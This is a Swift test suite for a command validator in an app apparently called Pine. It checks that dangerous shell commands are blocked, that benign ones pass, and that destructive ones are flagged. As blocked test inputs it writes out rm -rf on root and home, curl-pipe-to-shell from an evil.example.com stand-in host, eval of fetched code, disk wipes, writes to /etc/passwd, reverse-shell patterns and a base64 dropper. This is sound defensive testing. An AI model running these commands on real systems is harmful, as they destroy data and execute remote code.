//
//  UserTaskValidatorTests.swift
//  PineTests
//
//  Tests for UserTaskValidator (milestone #1088, item 4).
//  Verifies that dangerous commands are blocked, benign commands pass,
//  and the destructive-detection heuristic works correctly.
//

import Foundation
import Testing
@testable import Pine

@Suite("UserTaskValidator")
struct UserTaskValidatorTests {

    let validator = UserTaskValidator.default

    // MARK: - Dangerous commands that must be blocked

    @Test("rm -rf on root and home is blocked")
    func blocksRmRfRoot() {
        #expect(validator.validate(command: "rm -rf /").allowed == false)
        #expect(validator.validate(command: "rm -rf ~").allowed == false)
        #expect(validator.validate(command: "rm -rf ~/*").allowed == false)
        #expect(validator.validate(command: "rm -rf *").allowed == false)
        #expect(validator.validate(command: "rm -rf /Users").allowed == false)
        #expect(validator.validate(command: "rm -fr /").allowed == false)
        #expect(validator.validate(command: "rm --recursive --force /").allowed == false)
    }

    @Test("sudo is blocked")
    func blocksSudo() {
        #expect(validator.validate(command: "sudo rm /etc/passwd").allowed == false)
        #expect(validator.validate(command: "sudo apt-get update").allowed == false)
    }

    @Test("curl/wget piped to shell is blocked")
    func blocksCurlPipeSh() {
        #expect(validator.validate(command: "curl https://evil.example.com/script.sh | sh").allowed == false)
        #expect(validator.validate(command: "curl https://evil.example.com/script.sh | bash").allowed == false)
        #expect(validator.validate(command: "wget -qO- https://evil.example.com/script.sh | sh").allowed == false)
        #expect(validator.validate(command: "curl http://evil.example.com/p | zsh").allowed == false)
    }

    @Test("eval is blocked")
    func blocksEval() {
        #expect(validator.validate(command: "eval $PAYLOAD").allowed == false)
        #expect(validator.validate(command: "eval \"$(curl https://evil.example.com/cmd)\"").allowed == false)
    }

    @Test("diskutil eraseDisk is blocked")
    func blocksDiskErase() {
        #expect(validator.validate(command: "diskutil eraseDisk JHFS+ NewDisk disk1").allowed == false)
    }

    @Test("dd to device is blocked")
    func blocksDdToDevice() {
        #expect(validator.validate(command: "dd if=/dev/zero of=/dev/disk1").allowed == false)
    }

    @Test("writing to system directories is blocked")
    func blocksSystemDirWrite() {
        #expect(validator.validate(command: "echo bad > /etc/passwd").allowed == false)
        #expect(validator.validate(command: "echo bad > /System/Library/file").allowed == false)
    }

    @Test("reverse-shell patterns are blocked")
    func blocksReverseShell() {
        #expect(validator.validate(command: "nc -l 4444").allowed == false)
        #expect(validator.validate(command: "/bin/sh -i").allowed == false)
        #expect(validator.validate(command: "/bin/bash -i").allowed == false)
    }

    @Test("base64 dropper pattern is blocked")
    func blocksBase64Dropper() {
        let cmd = "echo dGVzdA== | base64 -d | sh"
        #expect(validator.validate(command: cmd).allowed == false)
    }

    // MARK: - Benign commands that must be allowed

    @Test("lint/format/build commands are allowed")
    func allowsBenignCommands() {
        #expect(validator.validate(command: "swiftlint --fix").allowed)
        #expect(validator.validate(command: "shfmt -w file.sh").allowed)
        #expect(validator.validate(command: "terraform fmt -").allowed)
        #expect(validator.validate(command: "prettier --write .").allowed)
        #expect(validator.validate(command: "swift build").allowed)
        #expect(validator.validate(command: "echo hello world").allowed)
        #expect(validator.validate(command: "cat file.txt").allowed)
        #expect(validator.validate(command: "grep -r pattern .").allowed)
        #expect(validator.validate(command: "git status").allowed)
        #expect(validator.validate(command: "npm test").allowed)
    }

    @Test("rm without -rf is allowed (not blocked by validator)")
    func allowsPlainRm() {
        // `rm file.txt` is not matched by the dangerous blocklist (only
        // `rm -rf <root>` is).  It IS detected as destructive for
        // confirmation purposes (see below).
        #expect(validator.validate(command: "rm temp.txt").allowed)
    }

    // MARK: - Empty / edge cases

    @Test("empty command is rejected")
    func rejectsEmptyCommand() {
        #expect(validator.validate(command: "").allowed == false)
        #expect(validator.validate(command: "   ").allowed == false)
    }

    // MARK: - Destructive detection

    @Test("destructive commands are detected")
    func detectsDestructive() {
        #expect(validator.isDestructive("rm temp.txt"))
        #expect(validator.isDestructive("rm -rf build/"))
        #expect(validator.isDestructive("chmod +x script.sh"))
        #expect(validator.isDestructive("chown root file"))
        #expect(validator.isDestructive("killall Finder"))
        #expect(validator.isDestructive("kill -9 1234"))
        #expect(validator.isDestructive("truncate -s 0 file"))
        #expect(validator.isDestructive("diskutil verifyDisk disk1"))
        #expect(validator.isDestructive("dd if=img.iso of=disk.img"))
    }

    @Test("benign commands are not destructive")
    func detectsBenign() {
        #expect(validator.isDestructive("swiftlint --fix") == false)
        #expect(validator.isDestructive("echo hello") == false)
        #expect(validator.isDestructive("terraform fmt -") == false)
        #expect(validator.isDestructive("git status") == false)
    }

    // MARK: - Allow-list

    @Test("allow-list permits listed executables")
    func allowsListedExecutables() {
        let v = UserTaskValidator(allowedExecutablePaths: ["/usr/bin/swift", "/opt/homebrew/bin/shfmt"])
        #expect(v.validate(command: "swift build").allowed)
        #expect(v.validate(command: "shfmt -w file.sh").allowed)
    }

    @Test("allow-list rejects unlisted executables")
    func rejectsUnlistedExecutables() {
        let v = UserTaskValidator(allowedExecutablePaths: ["/usr/bin/swift"])
        #expect(v.validate(command: "rm temp.txt").allowed == false)
        #expect(v.validate(command: "curl evil.com").allowed == false)
    }
}
